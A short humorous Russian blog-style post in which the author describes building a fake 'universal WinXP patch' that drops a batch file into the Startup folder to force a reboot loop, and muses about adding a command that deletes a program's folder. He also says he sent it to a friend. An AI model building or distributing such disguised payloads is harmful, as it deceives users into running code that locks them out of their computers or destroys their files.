
Работа. Делать нечего. Скомпилил «Универсальный патч WinXP для лузеров»: SFX с адресом распаковки C:\Documents and Settings\Default User\Главное меню\Программы\Автозагрузка, а в нём — батник:echo offshutdown -r -t 10 -с "Ваша машина зохвачена Ктулху и дебафнута на рекурсию. Админь." -fРешил, что кирпичей хватит на постройку пирамиды — после такого патча юзер тебя до самой смерти своей ОС запомнит. Антивирь ничего не заподозрит. А вот если между этими строчками впихнуть ещё del /f /q C:/Program Files/QIP...Два часа назад скинул патч знакомому, чтобы тот посмеялся. Через 30 секунд он из сети выпал — уже два часа нет. Надеюсь, это просто совпадение: SMS со словом «сцуко» пока не было.Не знаешь командной строки? Привык к гуёвым кнопочкам? Страдай!


